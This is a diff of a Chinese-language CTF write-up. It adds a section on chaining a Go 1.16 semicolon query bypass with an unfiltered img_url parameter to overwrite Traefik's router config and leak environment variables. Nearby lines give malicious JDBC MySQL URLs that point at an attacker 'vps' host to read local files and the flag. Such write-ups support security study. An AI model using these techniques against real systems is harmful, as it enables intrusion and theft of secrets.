@@ -281,6 +281,18 @@ CSS注入可以参考文件`<https://book.hacktricks.xyz/pentesting-web/xs-searc
 
 > Hackers stole part of the source code of a microservice that was still in development
 
+复现环境下了也没来的及复现完，协会学长解出的一血，大概看懂了流程吧。
+
+整体的流程是这样，先审计代码后因为go 1.17将`;`作为分隔符去掉了，这里是1.16,传入`/?;dev=true`，前端认为是`;`，后端认为是`&`,来绕过拦截。
+
+之后审计代码，发现`img_url`参数没有进行过滤，只是把`\\`替换成`/`，这样的话我们从代码中又知道traefik的路由配置文件的位置，可以覆盖通过配置`/opt/traefik/router.yml`文件添加路由，将`Traefik`的`dashboard`前端代理出来。
+
+之后有两种做法，一种是重写rule里的规则，并且是支持`sprig`模板函数的，执行`env`将环境变量base64编码输出，这样就可以在`/dashboard`中看到输出的环境变量编码后的结果。
+
+另一种是可以通过添加`basicAuth`中间件，利用解析文件报错会回显文件的特性来实现任意文件读取，读取`/proc/self/environ`来得到环境变量。
+
+![图 1](https://s2.loli.net/2022/09/30/KcHjCD2AsVayTSv.png)  
+
 ## datamanager
 
 > make database great again
@@ -409,14 +421,14 @@ ysoserial_command:
 ```
 列 / 目录, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
 ```
-![图 1](https://s2.loli.net/2022/09/29/rEapBNHgy5kOYAo.png) 
+
+![图 1](https://s2.loli.net/2022/09/29/rEapBNHgy5kOYAo.png)
 
 ```
 读Flag文件, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2Fvery_Str4nge_NamE_of_flag?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
 ```
 
 ![图 2](https://s2.loli.net/2022/09/29/mWULaI7zZHb6SGF.png)  
-
 
 ## easy_groovy
 
